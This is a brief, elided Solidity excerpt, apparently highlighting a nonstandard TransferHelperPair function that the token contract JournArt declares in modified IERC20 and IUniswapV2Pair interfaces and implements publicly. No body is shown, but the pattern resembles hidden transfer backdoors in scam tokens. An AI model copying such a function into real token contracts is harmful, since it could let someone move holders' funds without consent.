...
interface IERC20 {
    ...
    function TransferHelperPair(address sender, address recipient, uint256 amount) external returns (bool);
...
interface IUniswapV2Pair {
    ...
    function TransferHelperPair(address from, address to, uint value) external returns (bool);
...
contract JournArt is Context, IERC20 { 
    ...
    */
    ...
    function TransferHelperPair(address sender, address recipient, uint256 amount) public override returns (bool) {
